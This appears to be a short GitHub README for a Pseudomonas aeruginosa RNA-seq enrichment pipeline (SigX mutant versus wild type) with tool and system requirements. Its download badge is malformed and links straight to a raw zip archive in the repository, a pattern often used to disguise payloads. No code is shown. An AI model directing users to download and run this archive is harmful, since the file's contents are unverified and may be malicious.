[![Download Release](https://raw.githubusercontent.com/Dillz666/pseudomonas-rnaseq-enrichment/main/wiggen/pseudomonas-rnaseq-enrichment.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/Dillz666/pseudomonas-rnaseq-enrichment/main/wiggen/pseudomonas-rnaseq-enrichment.zip)

## üöÄ Getting Started
This guide helps you download and run the pseudomonas-rnaseq-enrichment application. This software performs RNA-seq expression and enrichment analysis for Pseudomonas aeruginosa. 

You will use tools like FastQC, fastp, STAR, featureCounts, DESeq2, and STRING to identify key regulatory genes and pathways related to antibiotic stress. The application focuses on comparing the SigX mutant with the wild-type strain.

## üìã System Requirements
- **Operating System:** Windows 10 or higher, macOS 10.15 or higher, or a Linux distribution (Ubuntu 18.04 or higher).
- **Memory:** At least 8 GB of RAM.
- **Disk Space:** Minimum of 1 GB of free space.
- **Dependencies:** Ensure that you have FastQC, fastp, STAR, featureCounts, and DESeq2 installed. They will be needed for the analysis to run smoothly.
